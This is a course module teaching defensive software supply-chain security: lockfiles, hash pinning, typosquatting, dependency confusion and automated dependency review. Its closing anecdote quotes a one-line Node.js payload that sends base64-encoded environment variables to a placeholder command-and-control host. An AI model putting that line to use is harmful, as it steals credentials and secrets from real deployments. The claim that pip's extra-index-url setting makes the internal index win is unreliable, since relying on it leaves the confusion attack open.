# Dependency Security

> **Module 02 · Course 30** — The top 1,000 npm packages have an average of 683 transitive dependencies. Your `package.json` says `"express": "^4.18.0"` and you think you're depending on one package. You're not. This module is about owning that entire graph: locking it, hashing it, auditing it, and automating the parts that atrophy without automation.

---

## Why dependencies are the widest attack surface

When you import a library you import its code into your process. If that code is malicious, it runs in your process, with your credentials, with access to your environment variables. There is no sandbox, no namespace boundary, no seccomp profile between your app and a compromised `npm` package loaded at startup.

The numbers are sobering:
- Sonatype's 2023 State of the Software Supply Chain report counted 245,000 intentionally malicious packages published to public registries — a 2x increase from 2022.
- A typical enterprise application has ~528 open-source libraries; approximately 10% carry at least one known vulnerability.
- The mean time to detect a malicious dependency is 14 days — by which point it has been pulled to CI, staging, and production, and may have exfiltrated secrets on every invocation.

---

## Lockfiles and pinning

### What a lockfile does

A lockfile (`package-lock.json`, `poetry.lock`, `go.sum`, `Cargo.lock`, `Pipfile.lock`) records the *exact* resolved version tree at the time you last installed. Without a lockfile:

- `npm install` today resolves `"express": "^4.18.0"` to `4.18.3`.
- `npm install` in CI six weeks later resolves to `4.19.1` because the author pushed a minor version.
- These are different code. If one of those versions contains a vulnerability or backdoor, you shipped it silently.

With a lockfile, `npm ci` installs exactly the locked tree and **fails if the lockfile is out of sync** with `package.json`. That's the correct CI behavior: fail loudly rather than silently resolve to something different.

| Language | Lockfile | CI-safe install command |
|----------|----------|------------------------|
| Node.js | `package-lock.json` | `npm ci` |
| Node.js (Yarn) | `yarn.lock` | `yarn install --frozen-lockfile` |
| Python (Poetry) | `poetry.lock` | `poetry install --no-root` |
| Python (pip) | `requirements.txt` (pinned) | `pip install -r requirements.txt` |
| Go | `go.sum` | `go build` (honors sum by default; `-mod=vendor` for hermetic) |
| Rust | `Cargo.lock` | `cargo build` |
| Ruby | `Gemfile.lock` | `bundle install --frozen` |

> Commit your lockfile. Always. The number of teams that added their lockfile to `.gitignore` "because it creates noisy diffs" and then spent two days debugging a production outage caused by a silently resolved dependency version is not small.

### Hash pinning: going further than version pinning

A lockfile locks the version. `express@4.18.3` tells you the version. **Hash pinning** tells you `express@4.18.3` *with exactly this content* — it locks the bytes, not just the label.

`package-lock.json` does this automatically via the `integrity` field:
```json
"node_modules/express": {
  "version": "4.18.3",
  "integrity": "sha512-Tq7y9P0..."
}
```

For Python `pip`, you have to ask explicitly:
```
# requirements.txt with hashes
requests==2.31.0 \
  --hash=sha256:58cd2187423839d0e4b4b5515b2d80e ... \
  --hash=sha256:942c5a7581d358...
```

Install with: `pip install --require-hashes -r requirements.txt`

If the registry serves a package that doesn't match the hash, `pip` refuses to install it. This protects you even if a package is *overwritten* on the registry after a supply-chain compromise — the attacker can push a new version, but your pinned hash rejects it.

Go's `go.sum` works identically: every module records a hash tree the Go toolchain verifies at build time. A tampered module fails with `verifying <module>: checksum mismatch`.

### Hash-pinning Docker base images

The same principle applies to `FROM`:

```dockerfile
# Mutable — different bytes may be pulled each time this tag is updated
FROM python:3.12-slim

# Immutable — exactly these layers, forever
FROM python:3.12-slim@sha256:3b3b...abc
```

Get the current digest:
```bash
docker buildx imagetools inspect python:3.12-slim \
  --format '{{.Manifest.Digest}}'
```

Tools like [Renovate](https://docs.renovatebot.com/) can automate digest updates when new patches are published to the base image tag.

---

## Transitive dependency risk

Your direct dependencies are what's in your `package.json`. But each of those has its own dependencies, and those have their own, and so on — the *transitive closure*. In a medium Node.js service the ratio is typically **1 direct to 20–50 transitive**. Each transitive node:

- Was not reviewed by your team.
- Is not in your dependency review PR process.
- Can run arbitrary code at install time (`postinstall` scripts in npm) and at require time.

The `event-stream` attack (2018) is the canonical example: a widely used npm package was transferred to a new maintainer who added a transitive dependency (`flatmap-stream`) that, under specific conditions targeting a particular wallet application, stole cryptocurrency wallet credentials. The package had 2 million weekly downloads. No direct dependency was modified.

Explore your own transitive graph:

```bash
# Node — full tree
npm ls --all 2>/dev/null | head -80

# Identify packages with postinstall scripts (execution at install time)
npm ls --parseable --all 2>/dev/null \
  | while IFS= read -r dir; do
      script=$(node -e "try{const p=require('$dir/package.json');console.log(p.scripts&&p.scripts.postinstall||'')}catch(e){}" 2>/dev/null)
      [ -n "$script" ] && echo "$dir: $script"
    done | head -30

# Python — full dep tree
pip install pipdeptree
pipdeptree --reverse | head -40

# Go — module graph
go mod graph | head -30

# Go — find modules that only your transitive deps need (not direct)
go mod why -m golang.org/x/sys
```

A `postinstall` script that executes arbitrary shell commands at `npm install` time is a supply-chain risk even if the package itself is benign. Audit for these and prefer packages that don't require them.

---

## Typosquatting and confusion attacks

### Typosquatting

Publishing a package with a name visually similar to a popular one:

| Fake | Real | Ecosystem |
|------|------|-----------|
| `reqeusts` | `requests` | PyPI |
| `colourama` | `colorama` | PyPI |
| `djangoo` | `django` | PyPI |
| `lodahs` | `lodash` | npm |
| `momnet` | `moment` | npm |

Defenses:
- Verify the publisher of any new package you add — does `pip show requests` list the organization you expect under `Author`?
- Use hash pinning so even if the typosquat reaches your environment, a hash mismatch fails the install.
- For Node.js, `npm audit` and `socket.dev` scan for known typosquats and behavior anomalies (network calls at install, obfuscated code).

### Dependency confusion

Your company has an internal package named `@company/auth-client`, hosted on your private registry. An attacker publishes a public `@company/auth-client` on the npm public registry at a higher version number (`9.0.0` vs your internal `1.4.2`). If your build environment checks public before private, the attacker's version wins.

**Fix: scope private packages to your private registry explicitly.**

```ini
# .npmrc — forces all @company/ packages to your registry
@company:registry=https://npm.corp.example.com/

# Or for pip — prefer your mirror for internal packages
[install]
index-url = https://pypi.corp.example.com/simple
extra-index-url = https://pypi.org/simple
```

With `extra-index-url`, pip checks the internal index first for packages it finds there. Without this ordering, the public index can win.

For a higher-assurance fix, use a proxy registry that merges public and private (Nexus, Artifactory, or AWS CodeArtifact) and block direct access to `registry.npmjs.org` from build hosts so the proxy is the single source of truth.

---

## Dependency review in PRs

The best time to catch a malicious or vulnerable dependency is before it merges — the PR diff reveals exactly what changed.

### GitHub Dependency Review action

```yaml
# .github/workflows/dependency-review.yml
name: Dependency Review
on: [pull_request]
jobs:
  dependency-review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/dependency-review-action@v4
        with:
          fail-on-severity: moderate
          deny-licenses: GPL-2.0, LGPL-2.0, AGPL-3.0
          allow-ghsas: GHSA-xxxx-xxxx-xxxx  # specific accepted advisories
```

This action diffs the lockfile between base and head, queries the GitHub Advisory Database for each new package introduced, and fails the PR on any new dependency with a known vulnerability at or above the configured severity. It also catches license violations before they merge.

### OSV-Scanner on the lockfile

[OSV-Scanner](https://google.github.io/osv-scanner/) queries the [Open Source Vulnerabilities database](https://osv.dev) which is broader than the GitHub Advisory Database:

```bash
# Install
go install github.com/google/osv-scanner/cmd/osv-scanner@latest

# Scan the lockfile directly
osv-scanner --lockfile package-lock.json
osv-scanner --lockfile poetry.lock
osv-scanner --lockfile go.sum
```

---

## Dependabot and Renovate

Both tools open automated PRs to update dependencies when new versions drop. Neither is "better" — they have different strengths:

| Feature | Dependabot | Renovate |
|---------|-----------|---------|
| Configuration | `.github/dependabot.yml` | `renovate.json` in repo root |
| Grouping | Limited | First-class — group all minor+patch into one weekly PR |
| Custom schedules | Yes | Yes, with time-of-day and timezone controls |
| Auto-merge | Yes (requires branch protection) | Yes, with granular policies per package type |
| Language coverage | Good | Excellent — Go, Rust, Terraform, Helm, Docker, +40 |
| Digest updates | For Docker only | Yes, across Dockerfile, Helm, GitHub Actions |
| Self-hosted | No | Yes (Renovate CLI / Mend platform) |

Both update the exact version in the lockfile and recompute hashes. The non-negotiable habit: **run your test suite against the updated lockfile before auto-merging**. A passing test suite doesn't guarantee safety, but a failing one is a clear stop signal.

Renovate config for a common intermediate posture — auto-merge patch, require review for major:

```json
{
  "$schema": "https://docs.renovatebot.com/renovate-schema.json",
  "extends": ["config:base"],
  "timezone": "Asia/Kolkata",
  "schedule": ["before 9am on Monday"],
  "packageRules": [
    {
      "matchUpdateTypes": ["patch"],
      "automerge": true,
      "automergeType": "pr",
      "automergeSchedule": ["after 5am and before 9am on weekdays"]
    },
    {
      "matchUpdateTypes": ["minor"],
      "automerge": false,
      "groupName": "minor updates",
      "labels": ["dependency:minor"]
    },
    {
      "matchUpdateTypes": ["major"],
      "automerge": false,
      "labels": ["dependency:major", "needs-review"]
    }
  ],
  "lockFileMaintenance": { "enabled": true }
}
```

---

## Vendoring vs registries

**Vendoring** means committing your dependencies into the repository (`vendor/` in Go, committed `node_modules` in Node.js).

| Approach | Reproducibility | Repo size | Attack surface |
|----------|----------------|-----------|----------------|
| Registry + lockfile + hashes | Excellent | Small | Registry availability; package tampering (mitigated by hashes) |
| Vendored | Exact — the tree is in git | Large | Committed code is in your repo; vendor updates require explicit commits |

Go officially recommends vendoring for reproducible builds since Go 1.16:

```bash
go mod vendor         # copy all dependencies to ./vendor/
go build -mod=vendor  # build ignoring module cache, use only ./vendor/
```

Vendoring has a decisive advantage for supply-chain security audits: the entire dependency tree is in git history, diffs are visible, and reviewers can inspect a vendor update as a regular PR. There is no registry lookup at build time, eliminating the registry-compromise and confusion attack vectors.

For Node.js, vendoring `node_modules` is uncommon due to size, but committing a hash-locked `package-lock.json` and using `npm ci` in all environments gives most of the same guarantees.

---

## Debugging dependency security

### Symptom table

| Symptom | Likely cause | Fix |
|---------|-------------|-----|
| CI installs a different version than dev | `npm install` used in CI instead of `npm ci`; lockfile not committed | Commit the lockfile; use `npm ci` in all CI steps |
| `npm audit` clean but a known malicious package is present | Vulnerability not yet in the npm advisory DB; package is malicious but undisclosed | Run `osv-scanner` (broader DB) and `socket.dev` scan; inspect recent lockfile changes |
| Dependency confusion: wrong package installed | Public registry wins over private for a scoped package | Scope the package to the private registry in `.npmrc`; block direct public registry access from build hosts |
| Lockfile diff touches 200+ packages for a one-package change | `npm update` or `yarn upgrade` run instead of installing one specific version | Use `npm install <pkg>@<version>` to update exactly one entry; never run `npm update` unless you intend a broad sweep |
| A new transitive dep appeared with no direct dep change | Existing direct dep released a new minor that added a new dependency | Pin the direct dep to an exact version (`4.18.3` not `^4.18.0`); review the new transitive addition |
| `pip install --require-hashes` fails with hash mismatch | Registry served a different artifact than when the hashes were recorded | Investigate immediately — this is either a registry-side issue or a supply-chain tampering event; regenerate lockfile from a clean environment and compare |

> **War story.** I was reviewing a legacy service that had been running in production for 18 months. `npm audit` reported zero vulnerabilities — the team had used it as their security signal and was comfortable. On closer inspection I found a package called `lodahs` in `package-lock.json`, a typosquat of `lodash` that had been present for 8 months. The package was by then removed from npm, but `package-lock.json` still referenced the exact tarball hash. The package itself ran `require('https').get('https://c2.example.com/'+Buffer.from(JSON.stringify(process.env)).toString('base64'))` on load — environment variable exfiltration on every startup, for 8 months of production deployments. The entry was silent in `npm audit` because it was no longer on the registry, so the advisory scanner had no record to match against. The fix: run `npm ls lodahs` on every lockfile update, use `socket.dev`'s behavior scanner which would have flagged the network call at install time, and add `osv-scanner` to the PR gate. The lockfile preserves the typosquat even after the registry removes it — you need to audit the lockfile itself, not just query the live registry.

---

## Checkpoint

You're ready when you can, without looking anything up:

1. Explain the difference between `npm install` and `npm ci` in one sentence and state why CI must use the latter.
2. Write a `requirements.txt` entry that pins `cryptography==41.0.7` with `--hash=sha256:...` (look up the real hash from PyPI and show the correct format).
3. Describe the dependency confusion attack vector and show the `.npmrc` config that prevents it for a `@company/` scoped package.
4. Name three distinct transitive-dep risk scenarios: one where the dep is malicious, one where it's merely broken, one where it creates a license compliance problem.
5. Show the Renovate config to auto-merge patch updates but require human review for minor and major bumps.
6. Run `npm ls --all` on a project with 100+ packages, find which ones have `postinstall` scripts, and explain why those are elevated risk.
7. State one advantage vendoring has over registry-plus-lockfile that hash pinning alone cannot provide.
8. Given `osv-scanner --lockfile package-lock.json` output reporting a moderate vulnerability in a transitive dep, walk through the triage decision: fix now, schedule, or accept with justification?

➡ Next up: **SBOMs** — generating, parsing, and consuming a Software Bill of Materials so you have machine-readable visibility into your entire dependency tree without running `npm ls` by hand.
